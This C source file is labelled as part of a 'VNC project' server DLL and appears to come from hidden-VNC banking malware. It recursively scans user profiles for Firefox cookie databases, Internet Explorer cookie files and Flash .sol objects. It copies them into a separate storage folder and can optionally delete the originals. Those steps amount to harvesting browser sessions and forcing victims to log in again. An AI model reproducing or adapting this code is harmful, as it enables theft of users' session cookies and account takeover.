//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// VNC project. Version 1.1
//	
// module: files.c
// $Revision: 137 $
// $Date: 2013-07-23 16:57:05 +0400 (Вт, 23 июл 2013) $
// description:
//	VNC-server DLL.

#include "common.h"
#include <shlobj.h>

#define	CRC_DIRECTORY	0xa2a84f43
#define	FILES_SCAN_SUBDIRECTORIES 1

#define	FILE_TYPE_SOL			0x10
#define	FILE_TYPE_IE_COOKIE		0x11
#define	FILE_TYPE_FF_COOKIE		0x12


#define wczFfProfiles	L"\\Mozilla\\Firefox\\Profiles\\"
#define wczSolFiles		L"\\Macromedia\\Flash Player\\"

#define	wczFFCookie1	L"cookies.sqlite"
#define	wczFFCookie2	L"cookies.sqlite-journal"
#define	wczSol			L"*.sol"
#define	wczTxt			L"*.txt"
#define	wczFfCookies	L"\\cookie.ff"
#define	wczIeCookies	L"\\cookie.ie"
#define	wczSols			L"\\sols"

typedef struct _FILE_DESCW
{
	LIST_ENTRY	Entry;
	HANDLE		Handle;
	ULONG		Flags;
	ULONG		Type;
	ULONG		TypeOffset;
	ULONG		SearchPathLen;	// length, in chars, of the initial path used to search files
	WCHAR		Path[0];
} FILE_DESCW, *PFILE_DESCW;


LPTSTR	g_SolStorageName;


static PFILE_DESCW FileDescAlloc(ULONG Length)
{
	PFILE_DESCW fDesc = hAlloc(sizeof(FILE_DESCW) + Length);
	if (fDesc)
	{
		memset(fDesc, 0, sizeof(FILE_DESCW) + Length);
		InitializeListHead(&fDesc->Entry);
	}
	return(fDesc);
}

//
//	Searches for files according to the specified Mask starting from the specified Path. 
//	For every file found allocates FILE_DESCW structure and links all theese structures into the FileListHead.
//	Returns number of files found.
//	Note: In the ANSI version of FindFirstFile the name is limited to MAX_PATH characters. So we have to use UNICODE version 
//		to completely scan all files.
//
ULONG	FilesScanW(
	PWCHAR				Path,			// directory to search in, should be ended with "\"
	PWCHAR				Mask,			// search mask
	PLIST_ENTRY			FilesList,		// the list where all FILE_DESCW structures will be linked
	PCRITICAL_SECTION	FilesListLock,	// file list locking object (OPTIONAL)
	ULONG				SearchPathLen,	// the length of the initial search path in chars, used to keep directory structure 
										//  relative to the search path
	ULONG				SearchFlags		// various flags
	)
{
	ULONG	Found = 0, PathLen, MaskLen, ScanLen = MAX_PATH;
	LPWIN32_FIND_DATAW	FindData = hAlloc(sizeof(WIN32_FIND_DATAW));
	PWCHAR	ScanPath;
	if (FindData)
	{
		PathLen = wcslen(Path);
		MaskLen = wcslen(Mask);

		if (SearchPathLen == 0)
			SearchPathLen = PathLen;

		while ((PathLen + MaskLen + 2) > ScanLen)		// 1 for "\\" and 1 for "\0"
			ScanLen += MAX_PATH;

		if (ScanPath = hAlloc(ScanLen * sizeof(WCHAR)))
		{
			HANDLE hFind;
			PFILE_DESCW	fDesc;	

			memset(FindData, 0, sizeof(WIN32_FIND_DATA));
			wcscpy(ScanPath, Path);
			wcscat(ScanPath, Mask);

			// Searching for files within the current directory first
			if ((hFind = FindFirstFileW(ScanPath, FindData)) != INVALID_HANDLE_VALUE)
			{
				do
				{
					// Skipping large files
					if (FindData->nFileSizeHigh)
						continue;

					if (FindData->cFileName[0] == '.')
						continue;

					if (fDesc = FileDescAlloc(sizeof(FILE_DESCW) + (PathLen + wcslen(FindData->cFileName) + 1) * sizeof(WCHAR)))
					{						
						wcscpy((PWCHAR)&fDesc->Path, Path);
						wcscat((PWCHAR)&fDesc->Path, FindData->cFileName);
		
						fDesc->SearchPathLen = SearchPathLen;
						fDesc->Flags = SearchFlags;

						if (FilesListLock)	EnterCriticalSection(FilesListLock);
						InsertTailList(FilesList, &fDesc->Entry);
						if (FilesListLock)	LeaveCriticalSection(FilesListLock);
					
						Found += 1;
					}
				} while(FindNextFileW(hFind, FindData) && WaitForSingleObject(g_AppShutdownEvent, 0) == WAIT_TIMEOUT);
				FindClose(hFind);
			}

			// Files are searched, looking for directories to scan them recursively
			wcscpy(ScanPath, Path);
			wcscat(ScanPath, L"*");
	
			if (hFind = FindFirstFileW(ScanPath, FindData))
			{
				do
				{
					if (FindData->cFileName[0] != '.' && (FindData->dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
					{
						MaskLen = wcslen(FindData->cFileName);
						if ((PathLen + MaskLen + 2) > ScanLen)		// 1 for "\\" and 1 for "\0"
						{
							hFree(ScanPath);
							do {
								ScanLen += MAX_PATH;
							} while ((PathLen + MaskLen + 2) > ScanLen);

							if (!(ScanPath = hAlloc(ScanLen * sizeof(WCHAR))))
								break;	// not enough memory
						}	// if ((PathLen + MaskLen + 2) > ScanLen)
						wcscpy(ScanPath, Path);
						wcscat(ScanPath, FindData->cFileName);
						wcscat(ScanPath, L"\\");

						Found += FilesScanW(ScanPath, Mask, FilesList, FilesListLock, SearchPathLen, SearchFlags);
					}	// if (FindData->cFileName[0] != '.' &&
				} while(FindNextFileW(hFind, FindData) && WaitForSingleObject(g_AppShutdownEvent, 0) == WAIT_TIMEOUT);

				FindClose(hFind);
			}	// if (hFind = FindFirstFileW(ScanPath, FindData))

			if (ScanPath)
				hFree(ScanPath);
		}	// if (ScanPath = 
		hFree(FindData);
	}	// if (FindData)
	return(Found);
}


//
//  This function creates a directory TypeDir within AppDataPath\g_SolStorageName directory and
//	 copies the specified file into it preserving it's directory struture starting ftom FilePathLen char.
//
static VOID	SynchronizeSolStorage(
	LPTSTR	AppDataPath,	// full path to current user application data directory
	PWCHAR	FilePath,		// full path to the file to copy
	ULONG	FilePathLen,	// number of chars from the beggining of the file path to skip
	PWCHAR	TypeDir			// name of the directory to create
	)
{
	PWCHAR	FileDir, FileName, SolName;
	ULONG	i, c, NameLen, TypeLen = 0;
	
	FileName = FilePath + FilePathLen;
	NameLen = lstrlenW(FileName);

	if (TypeDir)
		TypeLen = lstrlenW(TypeDir);

	// Creating full path to a new file
	if (SolName = hAlloc((lstrlen(AppDataPath) + lstrlen(g_SolStorageName) + 1 + TypeLen + 1 + NameLen + 1) * sizeof(WCHAR)))
	{
		i = 0;
		while(SolName[i] = (WCHAR)AppDataPath[i]) i += 1;
		c = i;
		i = 0;
		while(SolName[i + c] = (WCHAR)g_SolStorageName[i]) i += 1;

		// Trying to create a SOL storage directory
		CreateDirectoryW(SolName, NULL);

		if (TypeDir)
			lstrcatW(SolName, TypeDir);

		CreateDirectoryW(SolName, NULL);

		lstrcatW(SolName, L"\\");


		// Duplicating directory structure
		while(FileDir = wcschr(FileName, '\\'))
		{
			FileDir[0] = 0;
			lstrcatW(SolName, FileName);
			CreateDirectoryW(SolName, NULL);
			lstrcatW(SolName, L"\\");
			FileName = FileDir + 1;
			FileDir[0] = '\\';
		}

		lstrcatW(SolName, FileName);

		// Copiyng source file to the new file within SOL-storage directory
		CopyFileW(FilePath, SolName, FALSE);		

		hFree(SolName);
	}	// if (SolName = hAlloc(
}

//
//	Searches for FF-cookies and Flash SOL files, and copies them into the specified separate directory.
//	Internal directory structure for cookies and SOLs is being preserved.
//	
static WINERROR	SynchronizeCookiesAndSols(
	LPSTR	DirPath,	// target directory 
	BOOL	bClear		// specify TRUE if the original files should be deleted
	)
{
	WINERROR	Status = ERROR_NOT_ENOUGH_MEMORY;
	LIST_ENTRY	FilesList;
	ULONG	i, Count = 0;
	PWCHAR	Path;

	InitializeListHead(&FilesList);

	// Allocatig search path string for FF cookies
	if (Path = hAlloc((lstrlen(DirPath) + cstrlenW(wczFfProfiles) + 1 + 1) * sizeof(WCHAR)))	// 1 for BkSlash, 1 for null-char
	{
		// Copying DirPath to the search path string, converting to WCHAR
		i = 0;
		while(Path[i] = (WCHAR)DirPath[i]) i += 1;
		lstrcatW(Path, wczFfProfiles);

		// Searching for FF cookie-files by names
		Count += FilesScanW(Path, wczFFCookie1, &FilesList, NULL, 0, FILE_TYPE_FF_COOKIE);
		Count += FilesScanW(Path, wczFFCookie2, &FilesList, NULL, 0, FILE_TYPE_FF_COOKIE);

		hFree(Path);
	}

	// Allocating search path string for Flash sols
	if (Path = hAlloc((lstrlen(DirPath) + cstrlenW(wczSolFiles) + 1 + 1) * sizeof(WCHAR)))	// 1 for BkSlash, 1 for null-char
	{
		// Copying DirPath to the search path string, converting to WCHAR
		i = 0;
		while(Path[i] = (WCHAR)DirPath[i]) i += 1;
		lstrcatW(Path, wczSolFiles);

		// Searching for SOL-files by mask
		Count += FilesScanW(Path, wczSol, &FilesList, NULL, 0, FILE_TYPE_SOL);

		hFree(Path);
	}

	// Allocating search path string for IE cookies
	if (Path = hAlloc((MAX_PATH + 2) * sizeof(WCHAR)))
	{
		if (SHGetFolderPathW(0, CSIDL_COOKIES, 0, 0, Path) == NO_ERROR)
		{
			i = lstrlenW(Path);
			Path[i] = '\\';
			Path[i+1] = 0;

			// Searching for IE cookie-files by mask
			Count += FilesScanW(Path, wczTxt, &FilesList, NULL, 0, FILE_TYPE_IE_COOKIE);
		}
		hFree(Path);
	}


	if (Count)
	{
		PLIST_ENTRY	pEntry = FilesList.Flink;
		ASSERT(pEntry != &FilesList);

		// Deleting files found
		do
		{
			PFILE_DESCW	fDesc = CONTAINING_RECORD(pEntry, FILE_DESCW, Entry);
			PWCHAR	TypeDir = NULL;

			pEntry = pEntry->Flink;
			RemoveEntryList(&fDesc->Entry);

			switch(fDesc->Flags)
			{
			case FILE_TYPE_SOL:
				TypeDir = wczSols;
				break;
			case FILE_TYPE_IE_COOKIE:
				TypeDir = wczIeCookies;
				break;
			case FILE_TYPE_FF_COOKIE:
				TypeDir = wczFfCookies;
				break;
			default:
				break;
			}

			SynchronizeSolStorage(DirPath, (PWCHAR)&fDesc->Path, fDesc->SearchPathLen, TypeDir);

			if (bClear)
				DeleteFileW(fDesc->Path);
			hFree(fDesc);
			Count -= 1;
		} while(pEntry != &FilesList);

		Status = NO_ERROR;
	}	// if (Count)
	else
		Status = ERROR_FILE_NOT_FOUND;

	ASSERT(Count == 0);
	return(Status);
}